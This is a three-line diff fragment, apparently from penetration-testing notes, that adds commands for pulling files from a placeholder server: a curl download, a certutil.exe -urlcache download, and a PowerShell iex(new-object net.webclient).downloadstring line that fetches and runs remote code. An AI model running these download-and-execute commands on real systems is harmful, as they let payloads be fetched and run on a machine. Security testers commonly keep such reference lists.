@@ -1,0 +1,3 @@
+- `curl -o <filename> http://<server>`
+- `certutil.exe -urlcache -f http://<IP ADDRRESS>/<file name> <file name>`
+- `iex(new-object net.webclient).downloadstring('http://<IP>/<filename>')`
